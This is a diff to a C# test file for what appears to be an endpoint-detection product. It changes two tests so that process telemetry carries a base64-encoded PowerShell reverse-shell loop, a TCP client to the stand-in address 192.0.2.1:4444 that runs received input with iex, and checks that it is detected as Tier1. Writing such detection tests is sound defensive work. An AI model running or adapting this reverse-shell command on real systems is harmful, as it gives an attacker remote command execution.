@@ -210,10 +210,10 @@ namespace Sentinel.Tests
         }
 
         /// <summary>
-        /// Verifies that encoded PowerShell with evasion indicators triggers a Tier1 detection.
+        /// Verifies that an encoded socket command loop triggers a Tier1 detection.
         /// </summary>
         [Fact]
-        public async Task Pipeline_EncodedPowerShellWithEvasion_DetectedAsTier1()
+        public async Task Pipeline_EncodedSocketCommandLoop_DetectedAsTier1()
         {
             var telemetry = new ProcessTelemetry
             {
@@ -222,7 +222,7 @@ namespace Sentinel.Tests
                 ParentProcessId = 1000,
                 ParentProcessName = "cmd.exe",
                 ImagePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
-                CommandLine = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0",
+                CommandLine = "powershell.exe -NoProfile -EncodedCommand " + Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes("$c=New-Object Net.Sockets.TCPClient('192.0.2.1',4444);$s=$c.GetStream();while(($n=$s.Read($b,0,1024)) -gt 0){$o=iex $cmd;$s.Write($out,0,$out.Length)}")),
                 Timestamp = DateTime.UtcNow
             };
 
@@ -282,7 +282,7 @@ namespace Sentinel.Tests
                 ParentProcessId = 1000,
                 ParentProcessName = "cmd.exe",
                 ImagePath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
-                CommandLine = "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0",
+                CommandLine = "powershell.exe -NoProfile -EncodedCommand " + Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes("$c=New-Object Net.Sockets.TCPClient('192.0.2.1',4444);$s=$c.GetStream();while(($n=$s.Read($b,0,1024)) -gt 0){$o=iex $cmd;$s.Write($out,0,$out.Length)}")),
                 Timestamp = DateTime.UtcNow
             };
 
